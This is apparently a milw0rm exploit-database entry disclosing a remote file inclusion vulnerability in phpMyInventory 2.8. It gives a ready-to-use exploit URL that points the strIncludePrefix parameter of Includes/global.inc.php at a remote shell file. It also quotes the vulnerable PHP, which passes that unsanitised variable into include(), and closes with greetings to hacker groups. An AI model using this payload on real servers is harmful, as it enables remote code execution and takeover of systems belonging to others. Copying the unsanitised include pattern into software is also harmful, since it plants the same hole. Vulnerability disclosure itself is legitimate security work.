@@ -1,0 +1,52 @@
+########################################################################################
+phpMyInventory (pmi)
+v. 2.8
+FOUND BY : o0xxdark0o
+                   o0xxdark0o[at]msn.com
+DOWNLOAD : http://sourceforge.net/projects/phpmyinventory/
+REMOTE FILE ICLUDE
+########################################################################################
+FILE :
+PATH\Includes\global.inc.php
+########################################################################################
+EXPLOIT:
+www.xxx.com/pmi_v28/Includes/global.inc.php?strIncludePrefix=Shell.txt?
+########################################################################################
+thanks for all my friends.. str0ke ... oxdo .... cold z3ro...keenest
+www.hach-teach.org - www.3asfh.com - www.goldenawy.com - www.yee7.com
+########################################################################################
+CODE:
+<?
+ // where rare administrative emails will go
+ $adminEmail  = "youraddress@yourdomain.com";
+
+ $secureAdmin = 0; # set to 1 if SSL is available
+ $sslPort = 443; # what port, if using SSL?
+
+ $rowLimit = 12; # how many records any given page should show at one time
+
+ # -------------------------------------------------------------------- #
+
+ session_register("userID");
+ session_register("sessionTime");
+ session_register("sessionSecurity");
+
+ // by creating a separate set of includes for different domain names,
+ // you can serve multiple PMI's from one codebase.
+ //
+ // if ($SERVER_NAME = "dev.3gwt.net") {
+ //    $includeFolder = "Includes/3gwt";
+ // } else if ($SERVER_NAME = "www.foozball.com") {
+ //    $includeFolder = "Includes/foozball";
+ // } else {
+       $includeFolder = "Includes";
+ // }
+
+ $strIncludePrefix = $strIncludePrefix.$includeFolder;
+ Include($strIncludePrefix."/db.inc.php");
+-----there is more of the code download to see it in v. 2.8-----
+########################################################################################
+BY : o0xxdark0o
+      o0xxdark0o@msn.com
+
+# milw0rm.com [2007-06-16]
